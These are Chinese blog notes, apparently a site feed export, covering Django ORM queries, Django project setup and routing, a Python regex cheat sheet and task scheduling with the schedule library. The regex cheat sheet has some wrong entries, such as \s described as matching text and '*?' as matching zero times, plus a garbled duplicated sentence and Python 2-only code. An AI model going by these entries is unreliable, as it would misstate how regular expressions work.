可选参数。格式是正则表达式。用来拣选符合匹配正则表达式的文件</span></span><br><span class="line">    <span class="comment"># 　　　　recursive = True / False: 可选参数，默认为False。设定是否递归该目录下所有子目录的所有文件</span></span><br><span class="line"></span><br><span class="line">    add_date = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 设置初次创建的时间</span></span><br><span class="line">    update_date = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 设置最后修改的时间</span></span><br></pre></td></tr></table></figure><p>创建数据库一共需要三步：</p><p>修改models.py中模型<br>运行python3 manage.py makemigrations为改动创建迁移记录<br>运行python3 manage.py migrate，将操作同步到数据库。</p><h2 id="数据增删改查"><a href="#数据增删改查" class="headerlink" title="数据增删改查"></a>数据增删改查</h2><p>数据的添加方法：一步到位的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.objects.create(User=<span class="string">'zz'</span>)</span><br></pre></td></tr></table></figure><p>单个赋值的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">datas = data()</span><br><span class="line">datas.User = <span class="string">'陈二狗'</span></span><br><span class="line">datas.save()</span><br></pre></td></tr></table></figure><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><h2 id="常规的有5种方法获取数据，返回都是数据集"><a href="#常规的有5种方法获取数据，返回都是数据集" class="headerlink" title="常规的有5种方法获取数据，返回都是数据集"></a>常规的有5种方法获取数据，返回都是数据集</h2><p>第一种是 data.objects.all()</p><p>这种方法获取的是这张表里面的所有数据</p><p>第二种是 data.objects.get(id=1)</p><p><strong>这个比较坑，不常用，找不到直接异常</strong><br>这种方法必须确保获取的结果只有一个（多个对象会直接异常），没有匹配条件的时候会报异常，获取的条件是id=1</p><p>第三种方法是 data.objects.filter(id=2)</p><p>这种方法是筛选出id=2的数据,括号内还能有多个条件，比如(id=2,gender=’boy’)</p><p>第四种方法是 data.objects.exclude(id=2)</p><p>这种方法是获取到id不等于2的数据</p><p>第五种方法是 data.objects.order_by(name)</p><p>这种方法获取到的结果是按照name进行排序后的结果</p><h4 id="获取单个对象"><a href="#获取单个对象" class="headerlink" title="获取单个对象"></a>获取单个对象</h4><p>第一种方法是 data.objects.first(name=’zeo’)<br>data.objects.last(name=’zeo’)</p><p>这种方法获取到的结果是符合条件的第一个对象，当然还有最后一个对象，使用的是.last(name=’小桃红’)</p><p><strong>注释：这些方法都可迭代使用</strong></p><p>按照日期获取当天数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils <span class="keyword">import</span> timezone</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">now = timezone.now()</span><br><span class="line">start = now - timedelta(hours=<span class="number">23</span>,minutes=<span class="number">59</span>,seconds=<span class="number">59</span>)</span><br><span class="line">CurrentDaySubdomain = URL.objects.filter(change_time__gt=start)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> CurrentDaySubdomain:</span><br><span class="line">    print(c.url)</span><br></pre></td></tr></table></figure><p><em><strong>其他按照时间获取数据方法</strong></em></p><p>1、gt：大于某个时间<br>now = datetime.datetime.now()</p><p>start = now – datetime.timedelta(hours=23, minutes=59, seconds=59)<br>a=yourobject.objects .filter(youdatetimcolumn__gt=start)#前一天</p><p>2、gte：大于等于某个时间：<br>a=yourobject.objects .filter(youdatetimcolumn__gte=start)</p><p>3、lt：小于<br>a=yourobject.objects .filter(youdatetimcolumn__lt=start)</p><p>4、lte：小于等于<br>a=yourobject.objects .filter(youdatetimcolumn__lte=start)</p><p>5、range：查询时间段<br>start_date = datetime.date(2005, 1, 1)<br>end_date = datetime.date(2005, 3, 31)<br>Entry.objects.filter(pub_date__range=(start_date, end_date))</p><p>6、year：查询某年<br>Entry.objects.filter(pub_date__year=2005)</p><p>7、month：查询某月<br>Entry.objects.filter(pub_date__month=12)</p><p>8、day：某天<br>Entry.objects.filter(pub_date__day=3)</p><p>9、week_day：星期几<br>Entry.objects.filter(pub_date__week_day=2)</p><p>10、获取今天的日期，日期格式为yyyy-MM-dd</p><p>from django.utils.timezone import now, timedelta<br>date = now().date() + timedelta(days=-1) #昨天<br>date = now().date() + timedelta(days=0) #今天<br>date = now().date() + timedelta(days=1) #明天</p><p><strong>以上方法获取的数据的结果是QuerySet()类型的数据，是一个结果类，想要获取最后的实际结果，需要使用索引获取</strong></p><p>datas = data.objects.filter(id=2).values()[0]<br>这样的结果是一个字典，索引0即是获取values()列表的第一个结果</p><p>当然你也可以使用赋予变量的形式进行获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">datas = data.objects.get(id=<span class="number">1</span>)</span><br><span class="line">u_id = datas.id</span><br><span class="line">u_User = datas.User</span><br><span class="line"></span><br><span class="line">这种方式进行获取数据，这个前提是在只有一个数据的情况下进行</span><br></pre></td></tr></table></figure><p>如果是all()或者其他方法获取较多的数据集时候，也可以这样获取每个结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data_0 = data.objects.all()</span><br><span class="line"><span class="comment"># 这里的结果是一个数据集合，可以循环迭代和使用索引获取值</span></span><br><span class="line">data_1 = data_0[<span class="number">0</span>]</span><br><span class="line">u_id = data_1.id</span><br><span class="line">u_User = data_1.User</span><br><span class="line"><span class="comment"># 通过这样的方式，就可以实现进行单独数据的获取</span></span><br></pre></td></tr></table></figure><p>像这种的集合，如果想要把里面的数据全都打印出来，可以这么处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ret = <span class="string">''</span></span><br><span class="line">data_0 = data.objects.all()</span><br><span class="line"><span class="keyword">for</span> data_1 <span class="keyword">in</span> data_0:</span><br><span class="line">    ret += data_1.id + <span class="string">'|'</span> + data_1.User + <span class="string">'&lt;br&gt;'</span></span><br></pre></td></tr></table></figure><p>批量操作，查询加修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_subdomains.filter(subdomain_ip=all_subdomain_one.subdomain_ip).update(nmapscan=result_domain_ports_numbners)</span><br><span class="line">all_subdomains.filter(subdomain_ip=all_subdomain_one.subdomain_ip).update(nmapscan_ports=result_domain_ports)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django-笔记-创建</title>
      <link href="/2020/02/07/Django-%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA/"/>
      <url>/2020/02/07/Django-%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject Your_Project_Name</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Your_Project_Name/ <span class="comment"># 你存放项目的文件夹</span></span><br><span class="line">    manage.py      <span class="comment"># 命令行工具，可以用来启动Django，等等做很多事</span></span><br><span class="line">    Your_Project_Name/ <span class="comment"># 目录是真正的项目文件包裹目录，它的名字是你引用内部文件的包名</span></span><br><span class="line">        __init__.py       <span class="comment"># 定义包的空文件</span></span><br><span class="line">        settings.py       <span class="comment"># 项目的主配置文件</span></span><br><span class="line">        urls.py           <span class="comment"># 路由管理，相当于Flask中自己写的app.route('/')，不过这里统一管理，很方便</span></span><br><span class="line">        wsgi.py           <span class="comment"># 基于WSGI的web服务器进入点，提供底层的网络通信功能</span></span><br></pre></td></tr></table></figure><h2 id="APP模块添加"><a href="#APP模块添加" class="headerlink" title="APP模块添加"></a>APP模块添加</h2><p>比如你的项目下有个登陆功能，暂且把这个登陆的模块名叫做login，这个登陆的应用需要你使用命令生成然后进行配置，首先到你创建项目的文件夹下面，使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp login</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">login/        <span class="comment"># 该登陆模块的文件夹</span></span><br><span class="line">    __init__.py <span class="comment"># 包空文件</span></span><br><span class="line">    admin.py    <span class="comment"># 自动生成强大的后台管理文件</span></span><br><span class="line">    apps.py        <span class="comment"># 具体我不清楚</span></span><br><span class="line">    migrations/ <span class="comment"># 这个文件夹用来操作管理数据库的数据，可以做数据库的迁移之类</span></span><br><span class="line">        __init__.py <span class="comment"># </span></span><br><span class="line">    models.py    <span class="comment"># 用来生成数据库的文件，和Flask中的modules.py一毛一样呢</span></span><br><span class="line">    tests.py    <span class="comment"># 用来做测试代码的文件，啊，真是贴心呢</span></span><br><span class="line">    views.py    <span class="comment"># 就像Flask中的视图函数，不过这里专门分了一个文件让你写视图函数</span></span><br></pre></td></tr></table></figure><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver</span><br><span class="line"><span class="comment"># 启动,默认端口8000</span></span><br><span class="line">python3 manage.py runserver <span class="number">8080</span></span><br><span class="line"><span class="comment"># 启动，使用8080端口</span></span><br><span class="line">python3 manage.py runserver <span class="number">0</span>:<span class="number">8080</span></span><br><span class="line">并且修改文件settings.py</span><br><span class="line">ALLOWED_HOSTS = [<span class="string">'*'</span>,]</span><br><span class="line"><span class="comment"># 启动，监听所有人的访问，即允许所有人访问</span></span><br></pre></td></tr></table></figure><h2 id="路由urls-py"><a href="#路由urls-py" class="headerlink" title="路由urls.py"></a>路由urls.py</h2><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="comment"># 这个path函数的功能比较重要，最下面会说</span></span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> index,error</span><br><span class="line"><span class="comment"># 从视图函数文件中导入创建的两个视图函数</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">''</span>, index, name=<span class="string">'index'</span>),</span><br><span class="line">    <span class="comment"># 这里第一个是网址路由，第二个是视图函数，第三个是视图函数指定的名称，可以在任何地方使用这个名称调用这个视图函数</span></span><br><span class="line">    <span class="comment"># 哇塞，真实贴心实用呢</span></span><br><span class="line">    path(<span class="string">'error/'</span>, error, name=<span class="string">'error'</span>)</span><br><span class="line">    <span class="comment"># 这个的url目录就是error啦</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>使用静态文件<br>然后再根目录下面的settings.py中，</p><p>在底部添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line">STATICFILES_DIRS = (</span><br><span class="line">    os.path.join(os.path.join(BASE_DIR, <span class="string">'static'</span>)),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>设置html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="comment">#这句添加在html文件的最上面  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在需要的地方按照这个格式进行调用，如：</span></span><br><span class="line">&lt;img src=<span class="string">"&#123;% static 'image/404.jpg' %&#125;"</span>/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这里是引用z</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PATH函数功能</span><br><span class="line">path() 参数： route</span><br><span class="line">route 是一个匹配 URL 的准则（类似正则表达式）。当 Django 响应一个请求时，它会从 urlpatterns 的第一项开始，按顺序依次匹配列表中的项，直到找到匹配的项。</span><br><span class="line"></span><br><span class="line">这些准则不会匹配 GET 和 POST 参数或域名。例如，URLconf 在处理请求 https:<span class="comment">//www.example.com/myapp/ 时，它会尝试匹配 myapp/ 。处理请求 https://www.example.com/myapp/?page=3 时，也只会尝试匹配 myapp/。</span></span><br><span class="line"></span><br><span class="line">path() 参数： view</span><br><span class="line">当 Django 找到了一个匹配的准则，就会调用这个特定的视图函数，并传入一个 HttpRequest 对象作为第一个参数，被“捕获”的参数以关键字参数的形式传入。稍后，我们会给出一个例子。</span><br><span class="line"></span><br><span class="line">path() 参数： kwargs</span><br><span class="line">任意个关键字参数可以作为一个字典传递给目标视图函数。本教程中不会使用这一特性。</span><br><span class="line"></span><br><span class="line">path() 参数： name</span><br><span class="line">为你的 URL 取名能使你在 Django 的任意地方唯一地引用它，尤其是在模板中。这个有用的特性允许你只改一个文件就能全局地修改某个 URL 模式。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 正则表达式</title>
      <link href="/2020/02/07/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/02/07/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Python 正则表达式</p><p>速查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>匹配次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.         匹配任意字符一次</span><br><span class="line">*         匹配前面的表达式<span class="number">0</span>/n次</span><br><span class="line">+         匹配前面的表达式<span class="number">1</span>/n次</span><br><span class="line">？        匹配前面的表达式<span class="number">0</span>/<span class="number">1</span>次</span><br><span class="line">&#123;m&#125;        匹配前面的表达式m次</span><br><span class="line">&#123;m,n&#125;     匹配前面的表达式m到n次</span><br><span class="line">*？       匹配前面的表达式<span class="number">0</span>次</span><br><span class="line">+？       匹配前面的表达式<span class="number">1</span>次</span><br></pre></td></tr></table></figure><p>常用语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">re.S    匹配所有的字符</span><br><span class="line">re.I    匹配大小写</span><br><span class="line">re.M    多行匹配</span><br><span class="line">re.match从头开始匹配</span><br><span class="line">re.search全文匹配</span><br><span class="line">\d         匹配所有的数字</span><br><span class="line">\D        匹配所有的非数字</span><br><span class="line">\s        匹配所有的文字</span><br><span class="line">\S        匹配所有的非文本</span><br><span class="line">[]        字符集合，匹配里面的所有表达式，使用|分开</span><br></pre></td></tr></table></figure><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><p>创建正则表达式对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(pattern[, flags])</span><br></pre></td></tr></table></figure><p>#根据包含正则表达式的字符串创建模式对象<br>全文查找符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search(pattern, string[, flags])    </span><br><span class="line"><span class="comment">#在字符串中查找，只查找一个</span></span><br></pre></td></tr></table></figure><p>从头开始查找符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match(pattern, string[, flags])    </span><br><span class="line"><span class="comment">#在字符串的开始处匹配模式</span></span><br></pre></td></tr></table></figure><p>分割字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">split(pattern, string[, maxsplit=<span class="number">0</span>,flags])    </span><br><span class="line"><span class="comment">#根据模式的匹配项来分割字符串</span></span><br></pre></td></tr></table></figure><p>寻找所有符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">findall(pattern, string,flags)    </span><br><span class="line"><span class="comment">#列出字符串中模式的所有匹配项</span></span><br><span class="line"><span class="keyword">return</span> 数组</span><br></pre></td></tr></table></figure><p>替换字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub(pat,repl, string[,count=<span class="number">0</span>,flags])    </span><br><span class="line"><span class="comment">#将字符串中所有的pat的匹配项用repl替换</span></span><br></pre></td></tr></table></figure><p>注意 表 示 字 符 串 的 结 尾 ， 所 以 加 上 表示字符串的结尾，所以加上 表示字符串的结尾，所以加上表示匹配的内容必须在字符串的结尾<br>匹配整个字符串还要加上字符串开始标记^</p><p>注意写爬出的时候可以用正则表达式匹配多个对象，然后遍历的时候使用yield生成器，可以组合成字典的形式，然后把字典给json.dumps()转换成json的格式，最后保存在本地文本中。</p><h2 id="常规匹配的正则语法"><a href="#常规匹配的正则语法" class="headerlink" title="常规匹配的正则语法"></a>常规匹配的正则语法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">汉字：[\u4e00-\u9fa5]&#123;<span class="number">0</span>,&#125;</span><br><span class="line">英文和数字：[A-Za-z0<span class="number">-9</span>]+</span><br><span class="line">长度为<span class="number">3</span><span class="number">-20</span>的所有字符：.&#123;<span class="number">3</span>,<span class="number">20</span>&#125;</span><br><span class="line">Email地址：\w+([-+.]\w+)@\w+([-.]\w+).\w+([-.]\w+)*</span><br><span class="line">域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?</span><br><span class="line">InternetURL：[a-zA-z]+://[^\s] 或 ^http://([\w-]+.)+[\w-]+(/[\w-./?%&amp;=])?$</span><br><span class="line">手机号码：^(<span class="number">13</span>[<span class="number">0</span><span class="number">-9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15</span>[<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18</span>[<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$</span><br><span class="line">国内电话号码：\d&#123;<span class="number">3</span>&#125;-\d&#123;<span class="number">8</span>&#125;|\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">7</span>&#125;(<span class="number">0511</span><span class="number">-4405222</span>、<span class="number">021</span><span class="number">-87888822</span>)</span><br><span class="line">日期格式：^\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">空白行的正则表达式：\n\s*\r (可以用来删除空白行)</span><br><span class="line">腾讯QQ号：[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>,&#125;</span><br><span class="line">IP地址提取：\d+.\d+.\d+.\d+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python执行定时任务</title>
      <link href="/2020/02/07/Python%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2020/02/07/Python%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="Python执行定时任务"><a href="#Python执行定时任务" class="headerlink" title="Python执行定时任务"></a>Python执行定时任务</h2><p>python使用内置库和第三方库执行定时任务。</p><h3 id="使用-sched-模块"><a href="#使用-sched-模块" class="headerlink" title="使用 sched 模块"></a>使用 sched 模块</h3><p>sched相当于一个延时处理任务<br>schedule是简单明了的一个第三方定时任务库，需要先pip安装一下<br>一个很好的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义你要周期运行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"I'm working..."</span>)</span><br><span class="line"></span><br><span class="line">schedule.every(<span class="number">10</span>).minutes.do(job)               <span class="comment"># 每隔 10 分钟运行一次 job 函数</span></span><br><span class="line">schedule.every().hour.do(job)                    <span class="comment"># 每隔 1 小时运行一次 job 函数</span></span><br><span class="line">schedule.every().day.at(<span class="string">"10:30"</span>).do(job)         <span class="comment"># 每天在 10:30 时间点运行 job 函数</span></span><br><span class="line">schedule.every().monday.do(job)                  <span class="comment"># 每周一 运行一次 job 函数</span></span><br><span class="line">schedule.every().wednesday.at(<span class="string">"13:15"</span>).do(job)   <span class="comment"># 每周三 13：15 时间点运行 job 函数</span></span><br><span class="line">schedule.every().minute.at(<span class="string">":17"</span>).do(job)        <span class="comment"># 每分钟的 17 秒时间点运行 job 函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    schedule.run_pending()   <span class="comment"># 运行所有可以运行的任务</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义你要周期运行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">"I'm working..."</span>)</span><br><span class="line">    print(<span class="string">'接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"></span><br><span class="line">schedule.every(<span class="number">10</span>).seconds.do(job,msg=<span class="string">'10s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    schedule.run_pending()   <span class="comment"># 运行所有可以运行的任务</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="执行并发任务"><a href="#执行并发任务" class="headerlink" title="执行并发任务"></a>执行并发任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule,time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'任务1接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'任务2接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job3</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'任务3接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line">schedule.every(<span class="number">1</span>).seconds.do(job1,msg=<span class="string">'任务1'</span>)</span><br><span class="line">schedule.every(<span class="number">3</span>).seconds.do(job2,msg=<span class="string">'任务2'</span>)</span><br><span class="line">schedule.every(<span class="number">1</span>).seconds.do(job3,msg=<span class="string">'任务3'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    schedule.run_pending()</span><br></pre></td></tr></table></figure><p>实际上应该是顺序执行<br><img src="https://img-blog.csdnimg.cn/20200207104831217.png" alt="在这里插入图片描述"></p><p>加入使用threading完成并发<br><img src="https://img-blog.csdnimg.cn/20200207104939256.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> schedule,time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'任务1接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span 